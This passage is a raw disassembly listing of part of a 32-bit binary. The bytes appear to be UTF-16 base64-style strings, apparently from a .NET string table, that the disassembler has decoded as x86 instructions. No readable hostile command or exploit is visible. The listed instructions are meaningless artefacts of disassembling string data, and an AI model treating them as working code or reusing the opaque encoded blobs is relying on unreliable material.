  40ba32:	00 76 00             	add    %dh,0x0(%esi)
  40ba35:	70 00                	jo     0x40ba37
  40ba37:	32 00                	xor    (%eax),%al
  40ba39:	5a                   	pop    %edx
  40ba3a:	00 75 00             	add    %dh,0x0(%ebp)
  40ba3d:	31 00                	xor    %eax,(%eax)
  40ba3f:	79 00                	jns    0x40ba41
  40ba41:	54                   	push   %esp
  40ba42:	00 37                	add    %dh,(%edi)
  40ba44:	00 49 00             	add    %cl,0x0(%ecx)
  40ba47:	39 00                	cmp    %eax,(%eax)
  40ba49:	70 00                	jo     0x40ba4b
  40ba4b:	61                   	popa
  40ba4c:	00 65 00             	add    %ah,0x0(%ebp)
  40ba4f:	77 00                	ja     0x40ba51
  40ba51:	4b                   	dec    %ebx
  40ba52:	00 42 00             	add    %al,0x0(%edx)
  40ba55:	45                   	inc    %ebp
  40ba56:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40ba5a:	00 50 00             	add    %dl,0x0(%eax)
  40ba5d:	76 00                	jbe    0x40ba5f
  40ba5f:	2f                   	das
  40ba60:	00 63 00             	add    %ah,0x0(%ebx)
  40ba63:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba64:	00 49 00             	add    %cl,0x0(%ecx)
  40ba67:	61                   	popa
  40ba68:	00 78 00             	add    %bh,0x0(%eax)
  40ba6b:	49                   	dec    %ecx
  40ba6c:	00 49 00             	add    %cl,0x0(%ecx)
  40ba6f:	61                   	popa
  40ba70:	00 69 00             	add    %ch,0x0(%ecx)
  40ba73:	55                   	push   %ebp
  40ba74:	00 51 00             	add    %dl,0x0(%ecx)
  40ba77:	51                   	push   %ecx
  40ba78:	00 76 00             	add    %dh,0x0(%esi)
  40ba7b:	46                   	inc    %esi
  40ba7c:	00 4e 00             	add    %cl,0x0(%esi)
  40ba7f:	57                   	push   %edi
  40ba80:	00 4d 00             	add    %cl,0x0(%ebp)
  40ba83:	5a                   	pop    %edx
  40ba84:	00 49 00             	add    %cl,0x0(%ecx)
  40ba87:	42                   	inc    %edx
  40ba88:	00 48 00             	add    %cl,0x0(%eax)
  40ba8b:	51                   	push   %ecx
  40ba8c:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40ba90:	00 7a 00             	add    %bh,0x0(%edx)
  40ba93:	4f                   	dec    %edi
  40ba94:	00 31                	add    %dh,(%ecx)
  40ba96:	00 65 00             	add    %ah,0x0(%ebp)
  40ba99:	71 00                	jno    0x40ba9b
  40ba9b:	31 00                	xor    %eax,(%eax)
  40ba9d:	4f                   	dec    %edi
  40ba9e:	00 6b 00             	add    %ch,0x0(%ebx)
  40baa1:	76 00                	jbe    0x40baa3
  40baa3:	79 00                	jns    0x40baa5
  40baa5:	52                   	push   %edx
  40baa6:	00 53 00             	add    %dl,0x0(%ebx)
  40baa9:	51                   	push   %ecx
  40baaa:	00 34 00             	add    %dh,(%eax,%eax,1)
  40baad:	49                   	dec    %ecx
  40baae:	00 67 00             	add    %ah,0x0(%edi)
  40bab1:	41                   	inc    %ecx
  40bab2:	00 6b 00             	add    %ch,0x0(%ebx)
  40bab5:	4a                   	dec    %edx
  40bab6:	00 67 00             	add    %ah,0x0(%edi)
  40bab9:	6c                   	insb   (%dx),%es:(%edi)
  40baba:	00 34 00             	add    %dh,(%eax,%eax,1)
  40babd:	42                   	inc    %edx
  40babe:	00 59 00             	add    %bl,0x0(%ecx)
  40bac1:	38 00                	cmp    %al,(%eax)
  40bac3:	6c                   	insb   (%dx),%es:(%edi)
  40bac4:	00 41 00             	add    %al,0x0(%ecx)
  40bac7:	59                   	pop    %ecx
  40bac8:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  40bacc:	00 56 00             	add    %dl,0x0(%esi)
  40bacf:	37                   	aaa
  40bad0:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  40bad4:	00 39                	add    %bh,(%ecx)
  40bad6:	00 53 00             	add    %dl,0x0(%ebx)
  40bad9:	74 00                	je     0x40badb
  40badb:	75 00                	jne    0x40badd
  40badd:	47                   	inc    %edi
  40bade:	00 6d 00             	add    %ch,0x0(%ebp)
  40bae1:	77 00                	ja     0x40bae3
  40bae3:	71 00                	jno    0x40bae5
  40bae5:	4d                   	dec    %ebp
  40bae6:	00 66 00             	add    %ah,0x0(%esi)
  40bae9:	55                   	push   %ebp
  40baea:	00 72 00             	add    %dh,0x0(%edx)
  40baed:	43                   	inc    %ebx
  40baee:	00 58 00             	add    %bl,0x0(%eax)
  40baf1:	59                   	pop    %ecx
  40baf2:	00 38                	add    %bh,(%eax)
  40baf4:	00 62 00             	add    %ah,0x0(%edx)
  40baf7:	49                   	dec    %ecx
  40baf8:	00 55 00             	add    %dl,0x0(%ebp)
  40bafb:	6f                   	outsl  %ds:(%esi),(%dx)
  40bafc:	00 58 00             	add    %bl,0x0(%eax)
  40baff:	47                   	inc    %edi
  40bb00:	00 79 00             	add    %bh,0x0(%ecx)
  40bb03:	44                   	inc    %esp
  40bb04:	00 32                	add    %dh,(%edx)
  40bb06:	00 43 00             	add    %al,0x0(%ebx)
  40bb09:	2f                   	das
  40bb0a:	00 2b                	add    %ch,(%ebx)
  40bb0c:	00 33                	add    %dh,(%ebx)
  40bb0e:	00 79 00             	add    %bh,0x0(%ecx)
  40bb11:	54                   	push   %esp
  40bb12:	00 6e 00             	add    %ch,0x0(%esi)
  40bb15:	52                   	push   %edx
  40bb16:	00 63 00             	add    %ah,0x0(%ebx)
  40bb19:	58                   	pop    %eax
  40bb1a:	00 6a 00             	add    %ch,0x0(%edx)
  40bb1d:	4d                   	dec    %ebp
  40bb1e:	00 56 00             	add    %dl,0x0(%esi)
  40bb21:	4e                   	dec    %esi
  40bb22:	00 76 00             	add    %dh,0x0(%esi)
  40bb25:	2b 00                	sub    (%eax),%eax
  40bb27:	43                   	inc    %ebx
  40bb28:	00 55 00             	add    %dl,0x0(%ebp)
  40bb2b:	42                   	inc    %edx
  40bb2c:	00 58 00             	add    %bl,0x0(%eax)
  40bb2f:	72 00                	jb     0x40bb31
  40bb31:	58                   	pop    %eax
  40bb32:	00 7a 00             	add    %bh,0x0(%edx)
  40bb35:	66 00 74 00 44       	data16 add %dh,0x44(%eax,%eax,1)
  40bb3a:	00 49 00             	add    %cl,0x0(%ecx)
  40bb3d:	55                   	push   %ebp
  40bb3e:	00 71 00             	add    %dh,0x0(%ecx)
  40bb41:	67 00 45 00          	add    %al,0x0(%di)
  40bb45:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40bb49:	50                   	push   %eax
  40bb4a:	00 6f 00             	add    %ch,0x0(%edi)
  40bb4d:	57                   	push   %edi
  40bb4e:	00 45 00             	add    %al,0x0(%ebp)
  40bb51:	62 00                	bound  %eax,(%eax)
  40bb53:	58                   	pop    %eax
  40bb54:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40bb58:	00 51 00             	add    %dl,0x0(%ecx)
  40bb5b:	37                   	aaa
  40bb5c:	00 55 00             	add    %dl,0x0(%ebp)
  40bb5f:	43                   	inc    %ebx
  40bb60:	00 47 00             	add    %al,0x0(%edi)
  40bb63:	33 00                	xor    (%eax),%eax
  40bb65:	44                   	inc    %esp
  40bb66:	00 2b                	add    %ch,(%ebx)
  40bb68:	00 51 00             	add    %dl,0x0(%ecx)
  40bb6b:	64 00 74 00 53       	add    %dh,%fs:0x53(%eax,%eax,1)
  40bb70:	00 59 00             	add    %bl,0x0(%ecx)
  40bb73:	34 00                	xor    $0x0,%al
  40bb75:	4f                   	dec    %edi
  40bb76:	00 68 00             	add    %ch,0x0(%eax)
  40bb79:	75 00                	jne    0x40bb7b
  40bb7b:	63 00                	arpl   %eax,(%eax)
  40bb7d:	47                   	inc    %edi
  40bb7e:	00 58 00             	add    %bl,0x0(%eax)
  40bb81:	30 00                	xor    %al,(%eax)
  40bb83:	6a 00                	push   $0x0
  40bb85:	43                   	inc    %ebx
  40bb86:	00 4f 00             	add    %cl,0x0(%edi)
  40bb89:	51                   	push   %ecx
  40bb8a:	00 6a 00             	add    %ch,0x0(%edx)
  40bb8d:	42                   	inc    %edx
  40bb8e:	00 4e 00             	add    %cl,0x0(%esi)
  40bb91:	31 00                	xor    %eax,(%eax)
  40bb93:	48                   	dec    %eax
  40bb94:	00 4d 00             	add    %cl,0x0(%ebp)
  40bb97:	4a                   	dec    %edx
  40bb98:	00 32                	add    %dh,(%edx)
  40bb9a:	00 50 00             	add    %dl,0x0(%eax)
  40bb9d:	4f                   	dec    %edi
  40bb9e:	00 78 00             	add    %bh,0x0(%eax)
  40bba1:	37                   	aaa
  40bba2:	00 41 00             	add    %al,0x0(%ecx)
  40bba5:	6d                   	insl   (%dx),%es:(%edi)
  40bba6:	00 58 00             	add    %bl,0x0(%eax)
  40bba9:	75 00                	jne    0x40bbab
  40bbab:	33 00                	xor    (%eax),%eax
  40bbad:	34 00                	xor    $0x0,%al
  40bbaf:	44                   	inc    %esp
  40bbb0:	00 67 00             	add    %ah,0x0(%edi)
  40bbb3:	54                   	push   %esp
  40bbb4:	00 73 00             	add    %dh,0x0(%ebx)
  40bbb7:	79 00                	jns    0x40bbb9
  40bbb9:	6a 00                	push   $0x0
  40bbbb:	71 00                	jno    0x40bbbd
  40bbbd:	37                   	aaa
  40bbbe:	00 68 00             	add    %ch,0x0(%eax)
  40bbc1:	6a 00                	push   $0x0
  40bbc3:	6d                   	insl   (%dx),%es:(%edi)
  40bbc4:	00 4a 00             	add    %cl,0x0(%edx)
  40bbc7:	42                   	inc    %edx
  40bbc8:	00 46 00             	add    %al,0x0(%esi)
  40bbcb:	49                   	dec    %ecx
  40bbcc:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bbcf:	7a 00                	jp     0x40bbd1
  40bbd1:	74 00                	je     0x40bbd3
  40bbd3:	35 00 37 00 35       	xor    $0x35003700,%eax
  40bbd8:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  40bbdc:	00 79 00             	add    %bh,0x0(%ecx)
  40bbdf:	52                   	push   %edx
  40bbe0:	00 6f 00             	add    %ch,0x0(%edi)
  40bbe3:	30 00                	xor    %al,(%eax)
  40bbe5:	62 00                	bound  %eax,(%eax)
  40bbe7:	68 00 36 00 2f       	push   $0x2f003600
  40bbec:	00 77 00             	add    %dh,0x0(%edi)
  40bbef:	4b                   	dec    %ebx
  40bbf0:	00 43 00             	add    %al,0x0(%ebx)
  40bbf3:	51                   	push   %ecx
  40bbf4:	00 59 00             	add    %bl,0x0(%ecx)
  40bbf7:	33 00                	xor    (%eax),%eax
  40bbf9:	35 00 67 00 52       	xor    $0x52006700,%eax
  40bbfe:	00 6a 00             	add    %ch,0x0(%edx)
  40bc01:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40bc05:	49                   	dec    %ecx
  40bc06:	00 44 00 77          	add    %al,0x77(%eax,%eax,1)
  40bc0a:	00 66 00             	add    %ah,0x0(%esi)
  40bc0d:	76 00                	jbe    0x40bc0f
  40bc0f:	4d                   	dec    %ebp
  40bc10:	00 61 00             	add    %ah,0x0(%ecx)
  40bc13:	71 00                	jno    0x40bc15
  40bc15:	4d                   	dec    %ebp
  40bc16:	00 31                	add    %dh,(%ecx)
  40bc18:	00 6f 00             	add    %ch,0x0(%edi)
  40bc1b:	47                   	inc    %edi
  40bc1c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc1f:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40bc23:	71 00                	jno    0x40bc25
  40bc25:	73 00                	jae    0x40bc27
  40bc27:	50                   	push   %eax
  40bc28:	00 6e 00             	add    %ch,0x0(%esi)
  40bc2b:	4d                   	dec    %ebp
  40bc2c:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40bc30:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40bc34:	00 47 00             	add    %al,0x0(%edi)
  40bc37:	50                   	push   %eax
  40bc38:	00 6d 00             	add    %ch,0x0(%ebp)
  40bc3b:	43                   	inc    %ebx
  40bc3c:	00 38                	add    %bh,(%eax)
  40bc3e:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40bc42:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40bc46:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc49:	73 00                	jae    0x40bc4b
  40bc4b:	31 00                	xor    %eax,(%eax)
  40bc4d:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40bc51:	55                   	push   %ebp
  40bc52:	00 2b                	add    %ch,(%ebx)
  40bc54:	00 2b                	add    %ch,(%ebx)
  40bc56:	00 37                	add    %dh,(%edi)
  40bc58:	00 76 00             	add    %dh,0x0(%esi)
  40bc5b:	45                   	inc    %ebp
  40bc5c:	00 56 00             	add    %dl,0x0(%esi)
  40bc5f:	2b 00                	sub    (%eax),%eax
  40bc61:	53                   	push   %ebx
  40bc62:	00 5a 00             	add    %bl,0x0(%edx)
  40bc65:	71 00                	jno    0x40bc67
  40bc67:	77 00                	ja     0x40bc69
  40bc69:	33 00                	xor    (%eax),%eax
  40bc6b:	42                   	inc    %edx
  40bc6c:	00 4b 00             	add    %cl,0x0(%ebx)
  40bc6f:	43                   	inc    %ebx
  40bc70:	00 50 00             	add    %dl,0x0(%eax)
  40bc73:	71 00                	jno    0x40bc75
  40bc75:	2b 00                	sub    (%eax),%eax
  40bc77:	34 00                	xor    $0x0,%al
  40bc79:	6a 00                	push   $0x0
  40bc7b:	4f                   	dec    %edi
  40bc7c:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  40bc80:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40bc84:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40bc88:	00 43 00             	add    %al,0x0(%ebx)
  40bc8b:	79 00                	jns    0x40bc8d
  40bc8d:	72 00                	jb     0x40bc8f
  40bc8f:	52                   	push   %edx
  40bc90:	00 66 00             	add    %ah,0x0(%esi)
  40bc93:	55                   	push   %ebp
  40bc94:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  40bc98:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40bc9c:	00 35 00 45 00 42    	add    %dh,0x42004500
  40bca2:	00 6e 00             	add    %ch,0x0(%esi)
  40bca5:	45                   	inc    %ebp
  40bca6:	00 47 00             	add    %al,0x0(%edi)
  40bca9:	42                   	inc    %edx
  40bcaa:	00 66 00             	add    %ah,0x0(%esi)
  40bcad:	70 00                	jo     0x40bcaf
  40bcaf:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40bcb3:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40bcb7:	7a 00                	jp     0x40bcb9
  40bcb9:	2f                   	das
  40bcba:	00 30                	add    %dh,(%eax)
  40bcbc:	00 66 00             	add    %ah,0x0(%esi)
  40bcbf:	68 00 6f 00 62       	push   $0x62006f00
  40bcc4:	00 4f 00             	add    %cl,0x0(%edi)
  40bcc7:	4c                   	dec    %esp
  40bcc8:	00 77 00             	add    %dh,0x0(%edi)
  40bccb:	43                   	inc    %ebx
  40bccc:	00 63 00             	add    %ah,0x0(%ebx)
  40bccf:	73 00                	jae    0x40bcd1
  40bcd1:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40bcd5:	69 00 6f 00 4c 00    	imul   $0x4c006f,(%eax),%eax
  40bcdb:	39 00                	cmp    %eax,(%eax)
  40bcdd:	38 00                	cmp    %al,(%eax)
  40bcdf:	39 00                	cmp    %eax,(%eax)
  40bce1:	31 00                	xor    %eax,(%eax)
  40bce3:	62 00                	bound  %eax,(%eax)
  40bce5:	48                   	dec    %eax
  40bce6:	00 37                	add    %dh,(%edi)
  40bce8:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40bcec:	00 73 00             	add    %dh,0x0(%ebx)
  40bcef:	43                   	inc    %ebx
  40bcf0:	00 6e 00             	add    %ch,0x0(%esi)
  40bcf3:	79 00                	jns    0x40bcf5
  40bcf5:	38 00                	cmp    %al,(%eax)
  40bcf7:	42                   	inc    %edx
  40bcf8:	00 76 00             	add    %dh,0x0(%esi)
  40bcfb:	4e                   	dec    %esi
  40bcfc:	00 2f                	add    %ch,(%edi)
  40bcfe:	00 6a 00             	add    %ch,0x0(%edx)
  40bd01:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40bd05:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bd09:	58                   	pop    %eax
  40bd0a:	00 66 00             	add    %ah,0x0(%esi)
  40bd0d:	49                   	dec    %ecx
  40bd0e:	00 4a 00             	add    %cl,0x0(%edx)
  40bd11:	79 00                	jns    0x40bd13
  40bd13:	6c                   	insb   (%dx),%es:(%edi)
  40bd14:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40bd18:	00 30                	add    %dh,(%eax)
  40bd1a:	00 42 00             	add    %al,0x0(%edx)
  40bd1d:	67 00 36 00 35       	add    %dh,0x3500
  40bd22:	00 6f 00             	add    %ch,0x0(%edi)
  40bd25:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd26:	00 63 00             	add    %ah,0x0(%ebx)
  40bd29:	49                   	dec    %ecx
  40bd2a:	00 55 00             	add    %dl,0x0(%ebp)
  40bd2d:	39 00                	cmp    %eax,(%eax)
  40bd2f:	2b 00                	sub    (%eax),%eax
  40bd31:	59                   	pop    %ecx
  40bd32:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  40bd36:	00 39                	add    %bh,(%ecx)
  40bd38:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40bd3c:	00 68 00             	add    %ch,0x0(%eax)
  40bd3f:	30 00                	xor    %al,(%eax)
  40bd41:	53                   	push   %ebx
  40bd42:	00 52 00             	add    %dl,0x0(%edx)
  40bd45:	64 00 37             	add    %dh,%fs:(%edi)
  40bd48:	00 45 00             	add    %al,0x0(%ebp)
  40bd4b:	31 00                	xor    %eax,(%eax)
  40bd4d:	76 00                	jbe    0x40bd4f
  40bd4f:	53                   	push   %ebx
  40bd50:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40bd54:	00 33                	add    %dh,(%ebx)
  40bd56:	00 4b 00             	add    %cl,0x0(%ebx)
  40bd59:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40bd5d:	43                   	inc    %ebx
  40bd5e:	00 63 00             	add    %ah,0x0(%ebx)
  40bd61:	2b 00                	sub    (%eax),%eax
  40bd63:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd64:	00 45 00             	add    %al,0x0(%ebp)
  40bd67:	74 00                	je     0x40bd69
  40bd69:	51                   	push   %ecx
  40bd6a:	00 50 00             	add    %dl,0x0(%eax)
  40bd6d:	6c                   	insb   (%dx),%es:(%edi)
  40bd6e:	00 73 00             	add    %dh,0x0(%ebx)
  40bd71:	79 00                	jns    0x40bd73
  40bd73:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd74:	00 75 00             	add    %dh,0x0(%ebp)
  40bd77:	41                   	inc    %ecx
  40bd78:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40bd7e:	80 b1 5a 00 6f 00 65 	xorb   $0x65,0x6f005a(%ecx)
  40bd85:	00 30                	add    %dh,(%eax)
  40bd87:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd8a:	4d                   	dec    %ebp
  40bd8b:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  40bd8f:	00 66 00             	add    %ah,0x0(%esi)
  40bd92:	6d                   	insl   (%dx),%es:(%edi)
  40bd93:	00 6f 00             	add    %ch,0x0(%edi)
  40bd96:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd97:	00 65 00             	add    %ah,0x0(%ebp)
  40bd9a:	43                   	inc    %ebx
  40bd9b:	00 63 00             	add    %ah,0x0(%ebx)
  40bd9e:	37                   	aaa
  40bd9f:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  40bda3:	00 7a 00             	add    %bh,0x0(%edx)
  40bda6:	63 00                	arpl   %eax,(%eax)
  40bda8:	37                   	aaa
  40bda9:	00 6f 00             	add    %ch,0x0(%edi)
  40bdac:	6d                   	insl   (%dx),%es:(%edi)
  40bdad:	00 71 00             	add    %dh,0x0(%ecx)
  40bdb0:	37                   	aaa
  40bdb1:	00 4f 00             	add    %cl,0x0(%edi)
  40bdb4:	47                   	inc    %edi
  40bdb5:	00 39                	add    %bh,(%ecx)
  40bdb7:	00 6a 00             	add    %ch,0x0(%edx)
  40bdba:	30 00                	xor    %al,(%eax)
  40bdbc:	4d                   	dec    %ebp
  40bdbd:	00 65 00             	add    %ah,0x0(%ebp)
  40bdc0:	59                   	pop    %ecx
  40bdc1:	00 73 00             	add    %dh,0x0(%ebx)
  40bdc4:	69 00 4a 00 47 00    	imul   $0x47004a,(%eax),%eax
  40bdca:	44                   	inc    %esp
  40bdcb:	00 68 00             	add    %ch,0x0(%eax)
  40bdce:	47                   	inc    %edi
  40bdcf:	00 79 00             	add    %bh,0x0(%ecx)
  40bdd2:	6e                   	outsb  %ds:(%esi),(%dx)
  40bdd3:	00 4a 00             	add    %cl,0x0(%edx)
  40bdd6:	54                   	push   %esp
  40bdd7:	00 4a 00             	add    %cl,0x0(%edx)
  40bdda:	31 00                	xor    %eax,(%eax)
  40bddc:	4c                   	dec    %esp
  40bddd:	00 6f 00             	add    %ch,0x0(%edi)
  40bde0:	72 00                	jb     0x40bde2
  40bde2:	37                   	aaa
  40bde3:	00 4d 00             	add    %cl,0x0(%ebp)
  40bde6:	52                   	push   %edx
  40bde7:	00 33                	add    %dh,(%ebx)
  40bde9:	00 5a 00             	add    %bl,0x0(%edx)
  40bdec:	6c                   	insb   (%dx),%es:(%edi)
  40bded:	00 72 00             	add    %dh,0x0(%edx)
  40bdf0:	46                   	inc    %esi
  40bdf1:	00 2b                	add    %ch,(%ebx)
  40bdf3:	00 4e 00             	add    %cl,0x0(%esi)
  40bdf6:	45                   	inc    %ebp
  40bdf7:	00 6f 00             	add    %ch,0x0(%edi)
  40bdfa:	67 00 56 00          	add    %dl,0x0(%bp)
  40bdfe:	58                   	pop    %eax
  40bdff:	00 69 00             	add    %ch,0x0(%ecx)
  40be02:	66 00 2b             	data16 add %ch,(%ebx)
  40be05:	00 65 00             	add    %ah,0x0(%ebp)
  40be08:	55                   	push   %ebp
  40be09:	00 35 00 4b 00 48    	add    %dh,0x48004b00
  40be0f:	00 51 00             	add    %dl,0x0(%ecx)
  40be12:	6e                   	outsb  %ds:(%esi),(%dx)
  40be13:	00 30                	add    %dh,(%eax)
  40be15:	00 72 00             	add    %dh,0x0(%edx)
  40be18:	62 00                	bound  %eax,(%eax)
  40be1a:	43                   	inc    %ebx
  40be1b:	00 52 00             	add    %dl,0x0(%edx)
  40be1e:	76 00                	jbe    0x40be20
  40be20:	2f                   	das
  40be21:	00 58 00             	add    %bl,0x0(%eax)
  40be24:	5a                   	pop    %edx
  40be25:	00 69 00             	add    %ch,0x0(%ecx)
  40be28:	77 00                	ja     0x40be2a
  40be2a:	51                   	push   %ecx
  40be2b:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40be31:	80 b1 37 00 33 00 7a 	xorb   $0x7a,0x330037(%ecx)
  40be38:	00 48 00             	add    %cl,0x0(%eax)
  40be3b:	4d                   	dec    %ebp
  40be3c:	00 62 00             	add    %ah,0x0(%edx)
  40be3f:	6e                   	outsb  %ds:(%esi),(%dx)
  40be40:	00 53 00             	add    %dl,0x0(%ebx)
  40be43:	63 00                	arpl   %eax,(%eax)
  40be45:	6c                   	insb   (%dx),%es:(%edi)
  40be46:	00 4a 00             	add    %cl,0x0(%edx)
  40be49:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40be4d:	35 00 50 00 65       	xor    $0x65005000,%eax
  40be52:	00 52 00             	add    %dl,0x0(%edx)
  40be55:	69 00 57 00 65 00    	imul   $0x650057,(%eax),%eax
  40be5b:	45                   	inc    %ebp
  40be5c:	00 30                	add    %dh,(%eax)
  40be5e:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40be62:	00 70 00             	add    %dh,0x0(%eax)
  40be65:	4b                   	dec    %ebx
  40be66:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40be6a:	00 6b 00             	add    %ch,0x0(%ebx)
  40be6d:	42                   	inc    %edx
  40be6e:	00 39                	add    %bh,(%ecx)
  40be70:	00 53 00             	add    %dl,0x0(%ebx)
  40be73:	6a 00                	push   $0x0
  40be75:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40be79:	6a 00                	push   $0x0
  40be7b:	61                   	popa
  40be7c:	00 39                	add    %bh,(%ecx)
  40be7e:	00 6d 00             	add    %ch,0x0(%ebp)
  40be81:	37                   	aaa
  40be82:	00 78 00             	add    %bh,0x0(%eax)
  40be85:	4d                   	dec    %ebp
  40be86:	00 2f                	add    %ch,(%edi)
  40be88:	00 47 00             	add    %al,0x0(%edi)
  40be8b:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40be8f:	35 00 6e 00 35       	xor    $0x35006e00,%eax
  40be94:	00 41 00             	add    %al,0x0(%ecx)
  40be97:	58                   	pop    %eax
  40be98:	00 77 00             	add    %dh,0x0(%edi)
  40be9b:	47                   	inc    %edi
  40be9c:	00 58 00             	add    %bl,0x0(%eax)
  40be9f:	62 00                	bound  %eax,(%eax)
  40bea1:	58                   	pop    %eax
  40bea2:	00 53 00             	add    %dl,0x0(%ebx)
  40bea5:	77 00                	ja     0x40bea7
  40bea7:	53                   	push   %ebx
  40bea8:	00 71 00             	add    %dh,0x0(%ecx)
  40beab:	30 00                	xor    %al,(%eax)
  40bead:	55                   	push   %ebp
  40beae:	00 50 00             	add    %dl,0x0(%eax)
  40beb1:	45                   	inc    %ebp
  40beb2:	00 47 00             	add    %al,0x0(%edi)
  40beb5:	56                   	push   %esi
  40beb6:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40beba:	00 38                	add    %bh,(%eax)
  40bebc:	00 48 00             	add    %cl,0x0(%eax)
  40bebf:	39 00                	cmp    %eax,(%eax)
  40bec1:	33 00                	xor    (%eax),%eax
  40bec3:	45                   	inc    %ebp
  40bec4:	00 32                	add    %dh,(%edx)
  40bec6:	00 71 00             	add    %dh,0x0(%ecx)
  40bec9:	75 00                	jne    0x40becb
  40becb:	67 00 66 00          	add    %ah,0x0(%bp)
  40becf:	6d                   	insl   (%dx),%es:(%edi)
  40bed0:	00 79 00             	add    %bh,0x0(%ecx)
  40bed3:	2b 00                	sub    (%eax),%eax
  40bed5:	35 00 55 00 55       	xor    $0x55005500,%eax
  40beda:	00 4f 00             	add    %cl,0x0(%edi)
  40bedd:	51                   	push   %ecx
  40bede:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40bee4:	80 b1 49 00 38 00 6d 	xorb   $0x6d,0x380049(%ecx)
  40beeb:	00 57 00             	add    %dl,0x0(%edi)
  40beee:	58                   	pop    %eax
  40beef:	00 52 00             	add    %dl,0x0(%edx)
  40bef2:	43                   	inc    %ebx
  40bef3:	00 33                	add    %dh,(%ebx)
  40bef5:	00 41 00             	add    %al,0x0(%ecx)
  40bef8:	37                   	aaa
  40bef9:	00 51 00             	add    %dl,0x0(%ecx)
  40befc:	55                   	push   %ebp
  40befd:	00 76 00             	add    %dh,0x0(%esi)
  40bf00:	42                   	inc    %edx
  40bf01:	00 30                	add    %dh,(%eax)
  40bf03:	00 61 00             	add    %ah,0x0(%ecx)
  40bf06:	49                   	dec    %ecx
  40bf07:	00 35 00 57 00 44    	add    %dh,0x44005700
  40bf0d:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40bf11:	00 5a 00             	add    %bl,0x0(%edx)
  40bf14:	74 00                	je     0x40bf16
  40bf16:	37                   	aaa
  40bf17:	00 33                	add    %dh,(%ebx)
  40bf19:	00 71 00             	add    %dh,0x0(%ecx)
  40bf1c:	55                   	push   %ebp
  40bf1d:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf20:	49                   	dec    %ecx
  40bf21:	00 79 00             	add    %bh,0x0(%ecx)
  40bf24:	48                   	dec    %eax
  40bf25:	00 32                	add    %dh,(%edx)
  40bf27:	00 79 00             	add    %bh,0x0(%ecx)
  40bf2a:	30 00                	xor    %al,(%eax)
  40bf2c:	54                   	push   %esp
  40bf2d:	00 53 00             	add    %dl,0x0(%ebx)
  40bf30:	75 00                	jne    0x40bf32
  40bf32:	50                   	push   %eax
  40bf33:	00 79 00             	add    %bh,0x0(%ecx)
  40bf36:	68 00 42 00 31       	push   $0x31004200
  40bf3b:	00 66 00             	add    %ah,0x0(%esi)
  40bf3e:	43                   	inc    %ebx
  40bf3f:	00 42 00             	add    %al,0x0(%edx)
  40bf42:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf43:	00 2f                	add    %ch,(%edi)
  40bf45:	00 77 00             	add    %dh,0x0(%edi)
  40bf48:	43                   	inc    %ebx
  40bf49:	00 30                	add    %dh,(%eax)
  40bf4b:	00 5a 00             	add    %bl,0x0(%edx)
  40bf4e:	34 00                	xor    $0x0,%al
  40bf50:	53                   	push   %ebx
  40bf51:	00 6a 00             	add    %ch,0x0(%edx)
  40bf54:	34 00                	xor    $0x0,%al
  40bf56:	70 00                	jo     0x40bf58
  40bf58:	6a 00                	push   $0x0
  40bf5a:	79 00                	jns    0x40bf5c
  40bf5c:	35 00 65 00 31       	xor    $0x31006500,%eax
  40bf61:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf64:	55                   	push   %ebp
  40bf65:	00 62 00             	add    %ah,0x0(%edx)
  40bf68:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bf6c:	4e                   	dec    %esi
  40bf6d:	00 51 00             	add    %dl,0x0(%ecx)
  40bf70:	32 00                	xor    (%eax),%al
